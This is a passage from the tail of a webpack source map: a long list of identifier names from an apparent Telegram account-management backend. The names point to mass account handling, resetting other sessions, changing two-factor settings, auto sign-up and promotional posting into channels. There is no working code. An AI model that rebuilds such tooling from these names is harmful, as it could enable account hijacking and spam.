endFalseChats","dialogs","chatData","chat","activeConnections","getActiveConnectionCount","rateLimited","totalOperations","forwardMessages","auths","count","getMetadata","getStatistics","handleReconnect","recordReconnect","logWarning","processor","errors","processed","i","slice","id","scheduleMessageSend","album","setContentFilters","filters","processBatchWithProgress","completed","total","UsersService","ActiveChannelsService","ChannelsService","BufferClientService","TelegramManager","sessionString","StringSession","channelArray","contentFilters","activeClientSetup","groupDescription","invoke","Api","channels","CreateChannel","title","megagroup","forImport","accessHash","chats","folders","EditPeerFolders","folderPeers","InputFolderPeer","peer","InputPeerChannel","InviteToChannel","InputChannel","users","forwardSecretMsgs","totalMessages","forwardedCount","messages","media","filter","fromPeer","cleanupClient","handlers","listEventHandlers","removeEventHandler","destroy","getInputEntity","errorHandler","handlerFn","TelegramClient","parseInt","API_ID","API_HASH","connectionRetries","setLogLevel","LogLevel","ERROR","me","phone","addEventHandler","event","NewMessage","handleEvents","Chat","Channel","participants","GetParticipants","ChannelParticipantsRecent","hash","ChannelParticipants","userInfo","ChannelParticipant","userDetails","lastName","entityLike","getLastMsgs","msgs","resp","text","selfChatId","photoCount","ownPhotoCount","ownVideoCount","otherPhotoCount","otherVideoCount","videoCount","movieCount","messageHistory","toLocaleLowerCase","photo","fwdFrom","video","canSendTrueCount","canSendFalseCount","totalCount","isChannel","isGroup","broadcast","defaultBannedRights","sendMessages","replace","chatsArrayLength","ids","namePrefix","AddContact","e","mobiles","inputContacts","InputPhoneContact","ImportContacts","startsWith","LeaveChannel","JoinChannel","account","GetAuthorizations","auth","authorizations","isAuthMine","appName","country","deviceModel","resetAuthorization","field","values","some","criterion","ResetAuthorization","getAllChats","className","thumbnailUrl","getMediaUrl","date","sender","senderId","is_self","out","fromId","MessageMediaPhoto","sizes","thumb","MessageMediaDocument","document","mimeType","thumbs","button","sendMessage","buttons","KeyboardButtonUrl","Search","InputPeerEmpty","q","InputMessagesFilterPhotos","minDate","maxDate","addOffset","callLogs","InputMessagesFilterPhoneCalls","action","MessageActionPhoneCall","filteredResults","outgoing","incoming","chatCallCounts","totalCalls","logAction","peerId","ent","filteredChatCallCounts","isPrivate","SetPrivacy","InputPrivacyKeyPhoneCall","rules","InputPrivacyValueDisallowAll","InputPrivacyKeyProfilePhoto","InputPrivacyValueAllowAll","InputPrivacyKeyPhoneNumber","InputPrivacyKeyStatusTimestamp","InputPrivacyKeyAbout","UpdateProfile","photoIndex","photos","GetUserPhotos","selectedPhoto","Math","max","photoFileSize","photoBuffer","downloadFile","InputPhotoFileLocation","fileReference","thumbSize","dcId","outputPath","latest","dateActive","GetContacts","DeleteHistory","justClear","revoke","Block","mediaMessages","endOfMessages","thumbBuffer","downloadWithTimeout","mediaType","downloadError","warn","retryAfter","match","safeGetEntity","MessageMediaEmpty","fileLocation","inputLocation","InputDocumentFileLocation","chunkSize","iterDownload","file","requestSize","write","promise","race","_","getMediaDetails","DocumentEmpty","videoAttr","attributes","find","attr","DocumentAttributeVideo","fileNameAttr","DocumentAttributeFilename","size","fileName","duration","width","w","height","h","downloadFileFromUrl","baseUsername","newUserName","increment","UpdateUsername","CheckUsername","InputPrivacyKeyForwards","filePath","writer","createWriteStream","pipe","image","uploadFile","CustomFile","statSync","workers","UploadProfilePhoto","GetPassword","imapService","twoFaDetails","email","hint","newPassword","checkMailInterval","updateTwoFaSettings","isCheckPassword","emailCodeCallback","retry","codeInterval","onEmailCodeError","sendFile","DeletePhotos","newClient","start","phoneCode","waitForOtp","onError","save","trim","channelUpdate","updates","u","UpdateChannel","member","inputFile","EditPhoto","InputChatUploadedPhoto","EditTitle","EditChatAbout","slowMode","ToggleSlowMode","seconds","opts","scheduleDate","floor","getTime","uploadedFile","forceDocument","GetScheduledHistory","Message","mediaFiles","InputSingleMedia","InputMediaUploadedPhoto","InputMediaUploadedDocument","entities","SendMultiMedia","multiMedia","SendMedia","DocumentAttributeAudio","randomId","random","toDelete","pinned","deleteMessages","m","deletedCount","privacyRules","everybody","InputPrivacyValueAllowContacts","nobody","privacyMap","lastSeen","profilePhotos","forwards","calls","groups","InputPrivacyKeyChatInvite","authorizationsResult","devicesResult","GetWebAuthorizations","sessions","platform","systemVersion","dateCreated","ip","region","webSessions","domain","browser","exceptCurrent","ResetAuthorizations","ResetWebAuthorizations","ResetWebAuthorization","periodInSeconds","day","week","month","uniqueSenders","Set","messageTypes","other","topSenders","sort","a","b","mostActiveHours","hour","getHours","getMediaExtension","mime","filterHandler","NewMessageEvent","evaluateMessage","actions","executeFilterAction","keywords","messageText","keyword","mediaTypes","getMediaType","EditBanned","participant","bannedRights","ChatBannedRights","untilDate","getSearchFilter","InputMessagesFilterVideo","InputMessagesFilterDocument","InputMessagesFilterUrl","InputMessagesFilterEmpty","getEntityId","User","viewMessages","sendStickers","sendGifs","sendGames","sendInline","embedLinks","EditAdmin","adminRights","ChatAdminRights","changeInfo","postMessages","editMessages","banUsers","inviteUsers","pinMessages","addAdmins","anonymous","manageCall","ChannelParticipantsAdmins","ChannelParticipantsBanned","InputMessagesFilterVoice","filteredMessages","mediaDetails","hasMore","entityId","dialog","dialogError","generateCSV","contact","blocked","generateVCard","contactsResult","blockedContacts","GetBlocked","csvData","peers","p","success","Unblock","onlineContacts","c","online","withPhone","mutual","lastWeekActive","wasOnline","weekAgo","setDate","getDate","DialogFilter","includePeers","includedChats","excludePeers","excludedChats","pinnedPeers","includeContacts","nonContacts","includeNonContacts","includeGroups","broadcasts","includeBroadcasts","bots","includeBots","excludeMuted","excludeRead","excludeArchived","UpdateDialogFilter","GetDialogFilters","includedChatsCount","excludedChatsCount","inputMedia","getMimeType","getMediaAttributes","supportsStreaming","EditMessage","unreadCount","lastMessage","linkedChat","linkedChannel","SetDiscussionGroup","group","fromDate","setMonth","getMonth","stats","withMedia","withLinks","withForwards","byHour","fill","byType","privateChats","isUser","bot","deleted","fake","chatStats","ceil","batchResults","processingStart","callStats","audio","mediaStats","videos","recentActivityScore","recencyMultiplier","call","Document","interactionScore","activityBreakdown","videoCalls","audioCalls","mediaSharing","textMessages","processingTime","round","topChats","totalTime","PHONE_PATTERN","USERNAME_PATTERN","MESSAGE_MAX_LENGTH","CAPTION_MAX_LENGTH","FILE_SIZE_LIMIT","BATCH_SIZE_LIMIT","ALLOWED_MEDIA_TYPES","ALLOWED_PRIVACY_LEVELS","MESSAGE_TYPES","DEFAULT_PAGINATION","maxLimit","BaseBatchItemDto","ApiProperty","IsString","BatchItemDto","IsOptional","IsNumber","IsEnum","IsArray","default","ArrayMinSize","ArrayMaxSize","each","Transform","ChatStatisticsDto","ContactGroupDto","String","IsBoolean","ContactImportDto","IsNotEmpty","AdminPermission","AdminPermissionsDto","BaseGroupOperationDto","ValidateNested","Type","ApiPropertyOptional","IsObject","IsDateString","BaseMediaOperationDto","MediaFilterDto","IsUrl","MediaAlbumItemDto","VoiceMessageDto","MessageSearchDto","MetadataType","DialogsQueryDto","minimum","maximum","Min","Max","BulkMessageOperationDto","minLength","maxLength","minItems","maxItems","PrivacyLevelEnum","SecuritySettingsDto","GetScheduledMessagesDto","DeleteScheduledMessageDto","RescheduleMessageDto","BatchProcessItemDto","super","metadata","connectedAt","lastOperation","lastOperationTime","failedOperations","reconnectCount","getAllMetadata","totalOps","failedOps","totalReconnects","clientCount","totalClients","averageReconnects","clientRateLimiter","RateLimiter","operationRateLimiter","waitForRateLimit","lastUsed","cleanupInactiveConnections","maxIdleTime","FLOOD_WAIT","waitTime","interval","windowMs","maxRequests","checkRateLimit","validTimestamps","timestamp","resetLimit","logDebug","debug","TgSignupController","TgSignupService","cleanupStaleSessions","SESSION_CLEANUP_INTERVAL","phones","activeClients","disconnectClient","getRandomCredentials","API_CREDENTIALS","createdAt","LOGIN_TIMEOUT","validatePhoneNumber","test","clearTimeout","timeoutId","sendCode","existingSession","apiId","apiHash","retryDelay","useWSS","sendResult","SendCode","CodeSettings","currentNumber","allowAppHash","SentCodeSuccess","phoneCodeHash","isCodeViaApp","SentCodeTypeApp","verifyCode","newSession","reconnectError","signInResult","SignIn","AuthorizationSignUpRequired","handleNewUserRegistration","userData","processLoginResult","handle2FALogin","requires2FA","passwordSrpResult","passwordCheck","computeCheck","CheckPassword","randomName","signUpResult","SignUp","twoFA","lastActive","personalChats","totalChats","recentUsers","gender","create","InternalServerErrorException","PHONE_PREFIX","SendCodeDto","example","Matches","VerifyCodeDto","TgSignupResponse","tgSignupService","sendCodeDto","HttpStatus","CREATED","verifyCodeDto","BAD_REQUEST","OK","properties","statusCode","TOO_MANY_REQUESTS","INTERNAL_SERVER_ERROR","transformOptions","enableImplicitConversion","ApiExtraModels","ActiveChannelsController","createActiveChannelDto","createMultiple","createChannelDtos","findAll","updateActiveChannelDto","addReaction","addReactionDto","reactions","addReactions","getRandomReaction","removeReaction","CreateActiveChannelDto","UpdateActiveChannelDto","AddReactionDto","ActiveChannel","ActiveChannelSchema","activeChannelModel","promoteMsgsService","availableMsgs","bulkOps","dto","updateOne","bulkWrite","ordered","removeFromAvailableMsgs","$pull","addToAvailableMsgs","$addToSet","findOneAndDelete","randomIndex","reaction","getActiveChannels","skip","notIds","participantsCount","$gt","$ne","restricted","forbidden","aggregate","$match","$skip","$limit","$sort","$project","randomField","executeQuery","queryExec","resetWordRestrictions","updateMany","banned","resetAvailableMsgs","$expr","$lt","$size","$ifNull","updateBannedChannels","updateDefaultReactions","PromoteMsgsService","reactRestricted","wordRestriction","dMRestriction","PartialType","Prop","unique","mongoose","defaultMessages","defaultReactions","ArchivedClientController","archivedclientService","createClientDto","checkArchivedClients","fetchOne","CreateClientDto","SearchClientDto","UpdateClientDto","ArchivedClientService","ClientSchema","archivedclientModel","clientService","promoteRepl","product","_doc","deletedUser","$regex","RegExp","archivedClients","clientIds","ClientService","BufferClientController","joinChannelsforBufferClients","joinchannelForBufferClients","checkbufferClients","checkBufferClients","addNewUserstoBufferClients","body","badIds","goodIds","setAsBufferClient","createdOrupdate","createOrUpdate","CreateBufferClientDto","SearchBufferClientDto","UpdateBufferClientDto","BufferClientSchema","bufferClientModel","promoteClientService","joinChannelMap","leaveChannelMap","isJoinChannelProcessing","isLeaveChannelProcessing","JOIN_CHANNEL_INTERVAL","LEAVE_CHANNEL_INTERVAL","LEAVE_CHANNEL_BATCH_SIZE","bufferClient","throwErr","returnDocument","createOrUpdateUserDto","existingUser","deleteOne","removeFromBufferMap","clearBufferMap","skipExisting","clearLeaveChannelInterval","existingkeys","$nin","joinChannelQueue","leaveChannelQueue","joinChannelIntervalId","processTimeout","shift","channelsInfo","removeFromLeaveMap","clearLeaveMap","leaveChannelIntervalId","channelsToProcess","splice","availableDate","ConflictException","clientMobiles","flatMap","promoteMobile","bufferclients","promoteclients","promoteclientIds","cli","sixMonthsAgo","documents","pop","PromoteClientService","BufferClient","BuildController","buildService","BuildService","BuildSchema","buildModel","npointSerive","updateDocument","NpointService","Build","ChannelsController","createChannelDto","updateChannelDto","CreateChannelDto","SearchChannelDto","UpdateChannelDto","ChannelSchema","ChannelModel","getChannels","pattern","notPattern","$and","$not","$addFields","$rand","ClientController","updateClient","findAllMasked","NOT_FOUND","requestBody","addPromoteMobile","mobileNumber","removePromoteMobile","Client","settingupClient","clientModel","archivedClientService","lastUpdateMap","refreshMap","checkNpoint","existingClient","areJsonsNotSame","clientData","mapToJson","maskedCls","maskedClient","updatedAt","lean","allClients","every","uptimeChecker","uptimebot","setupClient","setupClientQueryDto","toBoolean","AUTO_CLIENT_SETUP","existingClientMobile","$lte","newBufferClient","existingMobile","newMobile","updateClientSession","setup","days","archiveOld","formalities","middleName","toUpperCase","updatedUsername","existingClientUser","deployKey","bufferClientDto","updatedBufferClient","lastUpdate","dbcoll","updateClients","generateNewSession","attempt","v","ArrayNotEmpty","NpointController","npointService","fetchDocument","postDocument","fetchAllDocuments","updatedDocument","content","csrfToken","cookie","baseUrl","signInUrl","fetchCsrfToken","request","fetchCsrfTokenFromHtml","ensureCsrfToken","documentId","post","token","put","csrfTokenMatch","CreatePromoteClientDto","SearchPromoteClientDto","UpdatePromoteClientDto","PromoteClientController","joinChannelsforPromoteClients","joinchannelForPromoteClients","checkpromoteClients","checkPromoteClients","addNewUserstoPromoteClients","setAsPromoteClient","PromoteClientSchema","promoteClientModel","promoteClient","removeFromPromoteMap","clearPromoteMap","clientPromoteMobiles","bufferClients","bufferClientIds","PromoteClient","PromoteMsgsController","PromoteMsgSchema","PromoteMsg","promotemsgModel","CreatePromoteStatDto","UpdatePromoteStatDto","PromoteStatController","promoteStatService","createPromoteStatDto","findByClient","updatePromoteStatDto","deleteAll","PromoteStatService","PromoteStat","PromoteStatSchema","promoteStatModel","promoteStat","deleteMany","reinitPromoteStats","uniqueChannels","releaseDay","lastUpdatedTimeStamp","of","ResponseType","additionalProperties","CreateStatDto","StatController","statService","createStatDto","findByChatIdAndProfile","profile","updateStatDto","UpdateStatDto","StatService","StatSchema","Stat","statModel","stat","Stat2Controller","Stat2Service","Stat2","CreateTransactionDto","UpdateTransactionDto","Transaction","TransactionSchema","TransactionController","transactionService","createTransactionDto","updateTransactionDto","TransactionService","transactionModel","newTransaction","transaction","findById","transactionId","$options","issue","transactions","countDocuments","updatedTransaction","findByIdAndUpdate","deletedTransaction","findByIdAndDelete","UpiIdController","UpiIdService","updateUpiIdsdto","UpiIdSchema","UpiId","UpiIdModel","upiIds","then","refreshUPIs","existingUpiIds","CreateUserDataDto","SearchDto","UpdateUserDataDto","UserData","UserDataSchema","UserDataController","userDataService","createUserDataDto","updateAll","updateUserDataDto","clearCount","UserDataService","userDataModel","callCounts","currentCount","resetPaidUsers","payAmount","limitTime","paidReply","CreateUserDto","SearchUserDto","UpdateUserDto","UserSchema","UsersController","createUserDto","queryParams","updateUserDto","userModel","clientsService","matchedCount","modifiedCount","app","NestFactory","DocumentBuilder","setTitle","setDescription","setVersion","build","use","req","next","header","enableCors","allowedHeaders","origin","SwaggerModule","createDocument","useGlobalPipes","reason","isShuttingDown","shutdown","signal","exit","init","listen","PORT","getUrl","bootstrap","originalUrl","endpoint","verbose","ms","str","arr","element","normalizedValue","inputString","matches","freeze","json1","json2","keysToIgnore","normalizeObject","obj","normalized","sortedKeys","normalized1","normalized2","makeBypassRequest","bypassUrl","bypassURL","bypassAxios","httpAgent","Agent","keepAlive","httpsAgent","shouldRetry","parsedError","isAxiosError","networkErrors","isRetryableStatus","notify","extractMessage","notificationText","ppplbot","httpFailuresChannel","calculateBackoff","base","min","pow","jitter","maxRetries","lastError","parsedUrl","URL","pathname","controller","AbortController","currentTimeout","abort","bypassResponse","bypassError","delay","errorData","notifbottokens","currentNotifTokenIndex","accountsChannel","botToken","apiUrl","ppplbottokens","currentPpplTokenIndex","updatesChannel","newPrefix","sendErr","prefixStr","notifChannel","ResponseCode","ErrorMessage","UserMessage","fullMessage","notifUrl","fetchError","module","require","__webpack_module_cache__","__webpack_exports__","__webpack_require__","moduleId","cachedModule","__webpack_modules__"],"sourceRoot":""}